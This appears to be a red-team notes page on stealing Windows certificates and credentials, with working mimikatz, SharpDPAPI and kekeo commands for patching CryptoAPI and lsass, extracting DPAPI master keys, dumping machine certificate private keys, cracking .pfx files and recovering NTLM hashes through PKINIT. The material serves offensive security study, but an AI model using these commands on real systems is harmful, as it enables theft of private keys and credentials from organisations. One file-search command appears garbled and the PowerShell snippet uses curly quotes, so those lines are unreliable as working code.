# Certificate Theft

## Theft1 - Exporting Certificates Using Crypto APIs

This method involves using an interactive desktop session to export the certificate. Right click the certificate in certmgr.msc go to all tasks and export it. This will export a password protected .pfx file. In the case the private keys are not exportable, mimikatz has a couple modules which would patch Microsoft's CryptoAPI (CAPI) or more recent Cryptography API: Next Generation (CNG), allowing the export of private keys. The CAPI command will patch CAPI in the current process whereas CNG requires patching lsass's memory, which can be detected.

```
mimikatz
crypto::capi
crypto:cng
```

## Theft2 - User Certficate Theft Using DPAPI

This method involves using both mimikatz and sharpDPAPI, or just SharpDPAPI. Essentially we need to steal the master key and use this to decrypt the private keys and associated certificates. 

User certificates are commonly stored in the following locations:
```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\SystemCertificates
%APPDATA%\Microsoft\SystemCertificates\My\Certificates\
```

The user private key are commonly stored in the following locations:
```
%APPDATA%\Microsoft\Crypto\RSA\User SID\
%APPDATA%\Microsoft\Crypto\Keys\
```

For a compromised user mimikatz can be used to retrieve the masterkey. This must be run in the security context of the user.
```
mimikatz
dpapi::masterkey /in:"C:\path\to\key"
```

If a password is known for a user, mimikatz can also retrieve the masterkey for this user. 
```
mimikatz
dpapi::masterkey /in:"C:\path\to\key" /sid:accountsid /password:userpassword
```

SharpDPAPI can be used alongside this created masterkey file, the private key itself, or the password of the user.
```
sharpDPAPI.exe certificates /mkfile:C:\temp\mkeys.txt
```
This command outputs a .pemfile and an openssl command at the end which can be used to convert it to a .pfx file.


## Theft3 - Machine Certificate Theft Using DPAPI

This is similar to Theft2, but instead using machine accounts. Both mimikatz and ShaprDPAPI can be used here, but sharpDPAPI is better. This also needs to be done from an elevated prompt.

With mimikatz the CAPI and CNG must be patched, same method as before in Theft1. After we can use the following command to export:
```
mimikatz
crypto::certificates /export /systemstore:LOCAL_MACHINE
```

SharpDPAPI has a certificates command that basically does everything all for us. From the specterops paper:

`SharpDPAPI’s certificates command with the /machine flag (while elevated) will
automatically elevate to SYSTEM, dump the DPAPI_SYSTEM LSA secret, use this to decrypt and
found machine DPAPI masterkeys, and use the key plaintexts as a lookup table to decrypt any
machine certificate private keys`

## Theft4 - Finding Certificate Files

It is possible for certificate files and their private keys to be stored insecurely, without the need for extracting them. Common file types are: .pem, .pfx, .p12 and .pkcs12 (less often). Other potential interesting files related to certificates are:

1. .key - contains private key
2. .crt/.cer - contains the certificate
3. .csr - certificate signing requiest file
4. .jks/.keystore/.keys - java keystore, may contain certs and private keys if java applications use them

Any file searching method will work for discovering these.

```
dir C:\ 10 \.(pfx|pem|p12)`$ false
```

Regarding a PKCS#12 file, if it is password protected pfx2john can be used to extract a hash.


If these files are found, the next step is understanding what EKUs are associated with the certificate, in other words what can the certificate do? The following powershell can be used to discover the EKUs for a certificate.

```powershell
$CertPath = “C:\path\to\cert.pfx”
$CertPass = “P@ssw0rd”
$Cert = New-Object
System.Security.Cryptography.X509Certificates.X509Certificate2
@($CertPath, $CertPass)
$Cert.EnhancedKeyUsageList
```

Certutil can also be used to parse a .pfx file

```
certutil.exe -dump -v cert.pfx
```

There is also small chance that a CA certificate file itself might be discoverd. The specterops paper showed the following image which displays how to identify this, using 3 different tools.

![](/images/cs3.png)


## Theft5 - NTLM Credential Theft via PKINIT

If an account authenticates and is granted a TGT through PKINIT, it is possible to extract the NTLM hash from the TGT. This is done to support legacy authentication on applications that do not support kerberos. 

Kekeo has a way to do this:

```
kekeo
tgt::pac /caname:DC01 /subject:harmj0y(current user) /castore:current_user /domain:domain.local
```
